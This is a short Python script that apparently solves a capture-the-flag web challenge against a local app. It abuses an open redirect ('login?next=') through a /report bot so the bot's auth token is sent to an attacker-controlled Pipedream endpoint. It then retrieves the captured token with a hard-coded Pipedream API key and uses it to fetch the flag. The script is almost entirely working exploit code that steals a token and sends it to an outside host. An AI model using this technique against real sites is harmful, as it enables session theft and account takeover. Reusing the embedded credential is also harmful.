import requests
import json
import time

APP_URL = "http://localhost:34466"
ATTACKER_URL = "https://8b8a4f6763b5907a2949f3a21e277bbc.m.pipedream.net/"


def solve():
    # payload: login?next=https://8b8a4f6763b5907a2949f3a21e277bbc.m.pipedream.net/
    report_response = requests.post(
        f"{APP_URL}/report", json={"path": f"login?next={ATTACKER_URL}"}
    )
    print(report_response.text)

    time.sleep(3)  # 3秒待機

    token = get_token()
    print(f"Token: {token}")

    flag_response = requests.get(
        f"{APP_URL}/flag", headers={"Authorization": f"Bearer {token}"}
    )
    print(flag_response.text)


def get_token():
    pipedream_token = "b666f230662f35880b33108633aae7b6"
    headers = {"Authorization": "Bearer {}".format(pipedream_token)}
    res = requests.get(
        "https://api.pipedream.com/v1/sources/dc_Xau4Zgk/event_summaries?limit=1&expand=event",
        headers=headers,
    ).text
    pipe_history = json.loads(res)
    try:
        token = pipe_history["data"][0]["event"]["query"]["token"]
        return token
    except Exception:
        print("ERROR: Could not get the token.")


if __name__ == "__main__":
    solve()
